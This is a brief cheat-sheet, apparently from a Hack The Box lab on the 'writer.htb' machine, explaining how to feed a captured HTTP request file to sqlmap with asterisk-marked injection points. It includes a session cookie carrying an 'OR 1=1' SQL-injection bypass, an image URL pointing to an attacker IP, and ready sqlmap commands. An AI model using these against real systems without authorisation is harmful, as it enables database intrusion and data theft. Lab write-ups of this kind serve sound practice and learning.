## Use SQL Map to execute query from file

Example of file to be send to SQL map:

target.txt
```
POST /dashboard/stories/edit/1 HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------15686989872295369694272055808
Content-Length: 1078
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/edit/1
Cookie: session=eyJ1c2VyIjoiYWRtaW5cIicgT1IgMT0xIC0tIDFcIiJ9.YXM0zA.njER3wzMFgIMj3SwY-YL9zGo1g8
Upgrade-Insecure-Requests: 1

-----------------------------15686989872295369694272055808
Content-Disposition: form-data; name="title"


On the Origin of Shadows*
-----------------------------15686989872295369694272055808
Content-Disposition: form-data; name="tagline"


aaaa*
-----------------------------15686989872295369694272055808
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


bbb*
-----------------------------15686989872295369694272055808
Content-Disposition: form-data; name="image_url"

http://10.10.15.31:9002/icon.png*
-----------------------------15686989872295369694272055808
Content-Disposition: form-data; name="content"

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*
-----------------------------15686989872295369694272055808--
```

Please note that target parameters are marked with '\*', this will indicate the place where injection shall take place.

Then execute SQL map as following:
```
$ sqlmap -r target.txt
```

## Launch sqlmap directly:

```
$ sqlmap -u http://test.com/page.php?id=10
```